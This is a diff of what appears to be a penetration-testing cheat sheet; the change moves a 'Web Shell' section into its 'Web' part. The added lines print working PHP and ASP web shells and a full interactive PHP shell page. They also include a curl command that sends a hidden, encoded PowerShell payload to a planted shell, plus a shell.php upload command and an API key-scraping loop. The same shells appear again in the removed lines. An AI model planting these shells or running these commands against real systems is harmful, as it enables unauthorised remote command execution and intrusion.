@@ -188,6 +188,45 @@ tar -xzvf backup.tar.gz -C .
 unzip backup.zip -d .
 
 ## Web
+[*] Web Shell
++---------- CMD Shells ----------+
+curl -G 'http://$TARGET/0.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
+
+PHP
+<?=`$_GET[cmd]`?>
+<?php system($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php shell_exec($_GET['cmd']); ?>
+<?php echo system($_GET['cmd']); ?>
+<?php echo passthru($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+
+ASP
+<% Response.ContentType = "text/plain"
+Set s = CreateObject("WScript.Shell")
+Set c = s.Exec("cmd /c " & Request("cmd"))
+Response.Write c.StdOut.ReadAll() %>
+
++---------- Full Shells ----------+
+<html>
+<body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+    <input id="cmd" type="TEXT" name="cmd" autofocus size="80" value="<?php echo isset($_GET['cmd']) ? htmlentities($_GET['cmd']) : ''; ?>" style="outline: none; background: inherit;border: none;font-size: 16px;color: inherit;font-family: inherit;font-weight: 800;">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {system($_GET['cmd'] . ' 2>&1');}
+?>
+</pre>
+<script>
+    var cmdElement = document.getElementById('cmd');
+    cmdElement.focus();
+    cmdElement.setSelectionRange(cmdElement.value.length, cmdElement.value.length);
+</script>
+</body>
+</html>
+
 [*] WordPress
 wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
@@ -244,45 +283,6 @@ wafw00f http://$TARGET
 [*] Curl
 cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerUrl, .url] | @csv'
 cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'
-
-[*] Web Shell
-+---------- CMD Shells ----------+
-curl -G '$DOM/0.php' --data-urlencode 'cmd=whoami /user /priv /groups'
-
-PHP
-<?=`$_GET[cmd]`?>
-<?php system($_GET['cmd']); ?>
-<?php passthru($_GET['cmd']); ?>
-<?php shell_exec($_GET['cmd']); ?>
-<?php echo system($_GET['cmd']); ?>
-<?php echo passthru($_GET['cmd']); ?>
-<?php echo shell_exec($_GET['cmd']); ?>
-
-ASP
-<% Response.ContentType = "text/plain"
-Set s = CreateObject("WScript.Shell")
-Set c = s.Exec("cmd /c " & Request("cmd"))
-Response.Write c.StdOut.ReadAll() %>
-
-+---------- Full Shells ----------+
-<html>
-<body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-    <input id="cmd" type="TEXT" name="cmd" autofocus size="80" value="<?php echo isset($_GET['cmd']) ? htmlentities($_GET['cmd']) : ''; ?>" style="outline: none; background: inherit;border: none;font-size: 16px;color: inherit;font-family: inherit;font-weight: 800;">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {system($_GET['cmd'] . ' 2>&1');}
-?>
-</pre>
-<script>
-    var cmdElement = document.getElementById('cmd');
-    cmdElement.focus();
-    cmdElement.setSelectionRange(cmdElement.value.length, cmdElement.value.length);
-</script>
-</body>
-</html>
 
 [*] File Upload
 curl --upload-file shell.php http://$TARGET:80/upload/
